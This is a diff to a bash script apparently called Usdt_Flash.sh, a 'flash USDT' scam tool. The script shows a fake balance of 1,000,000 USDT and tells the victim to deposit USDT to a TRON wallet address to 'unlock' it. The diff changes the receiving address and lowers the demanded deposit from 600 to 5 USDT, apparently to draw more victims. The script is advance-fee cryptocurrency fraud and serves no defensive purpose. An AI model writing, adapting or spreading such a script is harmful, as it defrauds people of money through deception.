@@ -7,7 +7,7 @@ cd Usdt_Flash && bash Usdt_Flash.sh
 balance=1000000
 hash_id="d26c9fb3e2738deb32d9d0e1ce0e7427211da34390955883dc2dc24a89603099"
 
-account_id="TD7XdP5mBseDsC9UcttSiYDzdbGN4PVytt
+account_id="TTF7heVarQrfLxeS5AEY9aq3xg8LbK5LXN
 
 usdt_logo="
 \e[38;2;38;161;123m$$$$$$\
@@ -36,7 +36,7 @@ echo -e "$usdt_logo"
 
 fancyBoxEcho "$welcome_message"
 
-echo -e "To unlock your balance of $balance USDT, please deposit 600 USDT to the following address: $account_id"
+echo -e "To unlock your balance of $balance USDT, please deposit 5 USDT to the following address: $account_id"
 
 function unlockBalance {
     echo " "
@@ -145,7 +145,7 @@ function refresh {
     echo -e "$usdt_logo"
     echo " "
     fancyBoxEcho "$welcome_message"
-    echo -e "To unlock your balance of $balance USDT, please deposit 600 USDT Under TRC20 to the following address: $account_id"
+    echo -e "To unlock your balance of $balance USDT, please deposit 5 USDT Under TRC20 to the following address: $account_id"
 }
 function refreshOnSuccess {
     echo "Authenticating....."
